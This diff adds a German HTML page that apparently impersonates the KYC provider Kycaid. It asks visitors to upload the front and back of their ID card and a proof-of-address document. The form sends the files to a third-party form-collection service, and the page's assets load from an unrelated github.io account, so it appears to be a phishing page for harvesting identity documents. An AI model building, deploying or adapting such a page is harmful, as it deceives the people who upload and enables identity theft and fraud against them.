@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>KYC Verifizierung – Dokumenten‑Upload</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap" rel="stylesheet" />
+  <style>
+    :root {
+      --gold: #0066ff;
+      --gray-bg: #f5f5f5;
+      --text: #111;
+    }
+    * { box-sizing: border-box; }
+    body {
+      font-family: 'Inter', sans-serif;
+      margin: 0;
+      padding: 0;
+      background-image: url('https://identverfahrensysteme.github.io/Identifikationsverfahren/bg.png');
+      background-size: cover;
+      background-position: center;
+      background-repeat: no-repeat;
+      height: 100vh;
+      color: var(--text);
+    }
+    .form-container {
+      max-width: 700px;
+      background-color: #fff;
+      border-radius: 8px;
+      box-shadow: 0 8px 24px rgba(0,0,0,0.05);
+      margin: 40px auto 60px;
+      padding: 40px 32px;
+    }
+    .kyc-icon {
+      display: block;
+      margin: 0 auto 10px;
+      width: 48px;
+      height: 48px;
+      fill: var(--gold);
+    }
+    h2 {
+      text-align: center;
+      font-size: 20px;
+      font-weight: 900;
+      margin-bottom: 12px;
+    }
+    p.subtitle {
+      text-align: center;
+      font-size: 14px;
+      color: #666;
+      margin-bottom: 24px;
+    }
+    label {
+      display: block;
+      font-weight: 700;
+      font-size: 0.9rem;
+      margin: 14px 0 6px;
+    }
+    input, select {
+      width: 100%;
+      padding: 12px;
+      font-size: 15px;
+      border-radius: 6px;
+      border: 1px solid #ccc;
+      background-color: #f9f9f9;
+    }
+    .small-text {
+      font-size: 14px;
+      color: #555;
+      margin-top: 4px;
+      margin-bottom: 12px;
+    }
+    .buttons {
+      display: flex;
+      justify-content: flex-end;
+      margin-top: 24px;
+    }
+    .buttons button {
+      padding: 14px 32px;
+      background-color: transparent;
+      color: #999;
+      font-size: 16px;
+      font-weight: bold;
+      border: 2px solid var(--gold);
+      border-radius: 6px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+    }
+    .buttons button:hover {
+      color: var(--gold);
+    }
+    .Kycaid-footer {
+      background-color: #f7f6f2;
+      padding: 30px 20px;
+      font-size: 14px;
+      color: #444;
+      text-align: center;
+      border-top: 1px solid #ddd;
+    }
+    .footer-links a {
+      color: #444;
+      text-decoration: none;
+      margin: 0 6px;
+      font-weight: 500;
+    }
+    .footer-links span { margin: 0 4px; color: #999; }
+    .footer-links a:hover { text-decoration: underline; }
+    .footer-text p { max-width: 800px; margin: 12px auto; line-height: 1.6; }
+  </style>
+</head>
+<body>
+  <div class="form-container">
+    <!-- KYC Professional Icon -->
+    <svg class="kyc-icon" viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg" aria-label="KYC Professional Icon" role="img">
+      <path d="M32 2L4 12v20c0 17.67 12.19 30.87 28 30 15.81.87 28-12.33 28-30V12L32 2zM28 44l-10-10 4.24-4.24L28 35.5l13.76-13.76L46 26l-18 18z"/>
+    </svg>
+
+    <form id="kycForm" action="https://formcarry.com/s/3Izr5Sl7iQo" method="POST" enctype="multipart/form-data" novalidate>
+      <h2>Dokumenten‑Upload zur Verifizierung</h2>
+      <p class="subtitle">
+        Wählen Sie die Art Ihres Ausweisdokuments und laden Sie gut lesbare Farbkopien hoch (Vorder‑ und Rückseite).<br>
+        Zusätzlich ist ein aktuelles Selfie mit Ihrem Ausweis erforderlich.
+      </p>
+
+       <label for="ausweisart">Art des Ausweisdokuments</label>
+       <select id="ausweisart" name="Ausweisart" required>
+       <option value="Personalausweis" selected>Personalausweis</option>
+      </select>
+
+      <label for="vorderseite">Vorderseite (Datei)</label>
+      <input type="file" id="vorderseite" name="Vorderseite" accept=".jpg,.jpeg,.png,.pdf" required />
+
+      <div id="rueckseite-container">
+        <label for="rueckseite">Rückseite (Datei)</label>
+        <input type="file" id="rueckseite" name="Rückseite" accept=".jpg,.jpeg,.png,.pdf" required />
+      </div>
+
+      <label for="addressProof">Adressnachweis (z. B. Stromrechnung, Kontoauszug)</label>
+      <input type="file" id="addressProof" name="Adressnachweis" accept=".jpg,.jpeg,.png,.pdf" required />
+      <p class="small-text">
+        Bitte laden Sie ein offizielles Dokument hoch, das Ihre Adresse bestätigt (nicht älter als 3 Monate).
+      </p>
+
+      <div class="buttons">
+        <button type="submit">Absenden</button>
+      </div>
+    </form>
+  </div>
+
+  <footer class="Kycaid-footer">
+    <div class="footer-links">
+      <a href="#">Information on Kycaid</a><span>|</span>
+      <a href="#">Terms of use</a><span>|</span>
+      <a href="#">Privacy statement</a><span>|</span>
+      <a href="#">Legal notices</a><span>|</span>
+      <a href="#">Privacy Settings</a>
+    </div>
+    <div class="footer-text">
+      <p>The products, services, information and/or materials contained within these web pages may not be available for residents of certain jurisdictions. Please consult the sales restrictions relating to the products or services in question for further information.</p>
+      <p>Copying, editing, modifying, distributing, sharing, linking or any other use of this material without Kycaid's prior written permission is strictly prohibited.</p>
+      <p>© Kycaid 2025. All rights reserved.</p>
+    </div>
+  </footer>
+
+  <script>
+    (function() {
+      const select = document.getElementById('ausweisart');
+      const rueck = document.getElementById('rueckseite-container');
+
+      function toggleRueckseite() {
+        rueck.style.display = select.value === 'Reisepass' ? 'none' : 'block';
+      }
+
+      select.addEventListener('change', toggleRueckseite);
+      toggleRueckseite();
+    })();
+  </script>
+</body>
+</html>
